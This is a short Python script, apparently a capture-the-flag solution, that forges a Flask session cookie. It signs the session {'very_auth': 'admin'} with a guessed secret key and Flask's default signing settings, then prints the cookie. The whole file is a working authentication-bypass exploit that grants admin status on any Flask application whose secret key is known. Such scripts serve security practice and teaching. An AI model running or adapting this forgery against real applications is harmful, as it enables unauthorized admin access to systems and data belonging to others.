import hashlib
from itsdangerous import URLSafeTimedSerializer, TimestampSigner
from flask.sessions import TaggedJSONSerializer

session = {'very_auth': 'admin'}
secret = 'peanut butter'

print(URLSafeTimedSerializer(
    secret_key = secret,
    salt = 'cookie-session',
    serializer = TaggedJSONSerializer(),
    signer = TimestampSigner,
    signer_kwargs={
        'key_derivation': 'hmac',
        'digest_method': hashlib.sha1
    }
).dumps(session))
